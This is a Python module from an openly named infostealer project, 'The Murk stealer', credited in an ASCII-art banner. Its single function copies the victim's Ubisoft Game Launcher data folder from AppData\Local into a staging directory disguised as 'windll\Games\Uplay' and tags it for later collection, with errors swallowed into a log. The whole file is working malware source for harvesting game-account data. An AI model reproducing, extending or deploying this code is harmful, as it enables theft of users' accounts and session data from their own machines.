#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#

from os import sep,environ
from shutil import copytree
from manager.logger import Log

path = r"\Ubisoft Game Launcher"

def Ubisoft(data):
    try:
        pathtofile = environ['USERPROFILE'] + sep + r'AppData\Local'
        user = environ['USERPROFILE'] + sep + r'AppData\Local'
        copytree(user+ sep + path,rf'{pathtofile}\windll\Games\Uplay')
        data.append("\n∟🎮Uplay")
        return data
    except Exception as error:
        Log(f"Ubisoft(Uplay) ---> {error}")
        return data